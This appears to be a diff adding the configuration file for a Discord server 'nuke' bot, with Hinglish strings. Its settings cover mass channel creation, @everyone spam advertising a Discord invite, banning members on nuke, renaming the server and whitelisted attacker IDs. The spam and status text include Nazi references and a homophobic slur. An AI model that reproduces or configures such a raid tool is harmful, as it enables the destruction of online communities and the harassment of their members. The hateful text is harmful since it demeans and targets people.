@@ -1,0 +1,26 @@
+{
+   "token": "APNA BOT KA TOKEN DAL",
+   "prefix": "!",
+   "nuke_prefix": ".",
+   "names_of_channels_and_roles": [
+      "SKID KIYA TO TU GAY"
+   ],
+   "name_of_webhooks": "PHONIX PAPA",
+   "spam_text": "# .GG/WARONTOP NAZI WALE AIYE H @everyone @here",
+   "spam_mode": 1,
+   "channels_create_count": 10,
+   "spam_in_channel_count": 10,
+   "server_name": "khatam, bye bye tata good bye geya khatam",
+   "whitelisted_ids": [
+      1207760690899849350,
+      743781026534260836
+   ],
+   "only_whitelisted_users_can_perform_actions": false,
+   "Enable logging?": false,
+   "Ban on server nuke?": true,
+   "ban_reason": ".GG/WARONTOP",
+   "invisible_mode": false,
+   "Enable_activity": true,
+   "Activity_type": "playing",
+   "Activity_name": "RUNNING Nazi.exe By PHON!X </>"
+}
